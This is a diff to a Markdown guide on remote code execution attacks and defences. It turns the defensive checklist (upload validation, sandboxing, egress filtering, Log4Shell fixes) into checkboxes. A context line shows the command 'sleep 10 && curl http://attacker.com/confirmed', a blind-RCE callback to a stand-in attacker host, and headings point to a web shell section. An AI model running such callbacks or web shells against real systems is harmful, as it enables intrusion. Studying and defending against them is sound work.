@@ -585,7 +585,7 @@ sleep 10 && curl http://attacker.com/confirmed
 ### File Upload → RCE Chains
 
 #### 1. Web Shell Upload
-/gitcomm
+
 **PHP Web Shells:**
 
 ```php
@@ -1039,39 +1039,39 @@ Avoid inserting user input into code that gets evaluated. Also treat user upload
 
 ### Defensive Checklist
 
-- **Eliminate Dangerous Functions**: Remove `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible
-- **Parameterized Execution**: Use parameterized/array-based process execution (`shell=False`); escape+allowlist arguments
-- **Template Engine Hardening**: Disable dangerous functions/tags; enable sandbox mode; don't accept user templates
-- **Strict Upload Validation**:
+- [ ] **Eliminate Dangerous Functions**: Remove `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible
+- [ ] **Parameterized Execution**: Use parameterized/array-based process execution (`shell=False`); escape+allowlist arguments
+- [ ] **Template Engine Hardening**: Disable dangerous functions/tags; enable sandbox mode; don't accept user templates
+- [ ] **Strict Upload Validation**:
   - Enforce content-type AND extension checks
   - Verify via magic bytes (file signature)
   - Re-encode/process files (strip metadata with exiftool -all=)
   - Store uploads outside web root
-- **Sandbox File Processing**:
+- [ ] **Sandbox File Processing**:
   - Process uploads in isolated containers/VMs
   - Use seccomp, AppArmor, SELinux restrictions
   - Run as non-root with minimal permissions
   - No network access during processing
   - Delay publish until validation completes
-- **Safe Deserialization**:
+- [ ] **Safe Deserialization**:
   - Prefer JSON/XML with strict schemas
   - Sign and verify serialized data
   - Avoid `pickle`, `marshal`, native object graphs
   - Use allowlists for permitted classes
-- **Dependency Management**:
+- [ ] **Dependency Management**:
   - Keep libraries updated (ImageMagick, ExifTool, FFmpeg, Log4j, etc.)
   - Pin versions and audit dependencies
   - Subscribe to security advisories
   - Use tools: `npm audit`, `pip-audit`, `OWASP Dependency-Check`
-- **Network Segmentation**:
+- [ ] **Network Segmentation**:
   - Implement egress filtering to prevent OAST callbacks
   - Restrict outbound connections from app servers
   - Monitor DNS queries for suspicious patterns
-- **WAF/RASP**:
+- [ ] **WAF/RASP**:
   - Deploy Web Application Firewall with RCE signatures
   - Consider Runtime Application Self-Protection (RASP)
   - Log and alert on suspicious payloads
-- **Log4Shell Specific**:
+- [ ] **Log4Shell Specific**:
   - Update to Log4j 2.17.1+
   - Set `log4j2.formatMsgNoLookups=true`
   - Remove JndiLookup class from classpath
